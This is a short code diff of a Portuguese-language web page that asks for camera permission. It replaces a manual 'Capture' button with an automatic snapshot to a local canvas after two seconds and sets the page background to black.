@@ -26,7 +26,7 @@
     <h2></h2>
     <p id="instruction">Clique em "Permitir" para usar sua câmera.</p>
     <video id="video" width="320" height="240" autoplay></video>
-    <button id="snap">Capture</button>
+    
     <canvas id="canvas" width="320" height="440"></canvas>
     <p id="message"></p>
 
@@ -52,12 +52,11 @@
 
             setTimeout(()=>{
 context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                document.body.style.backgroundColor = 'black'
             },2000)
 
             // Capturar a imagem
-            snap.addEventListener('click', () => {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            });
+            
         })();
     </script>
 </body>
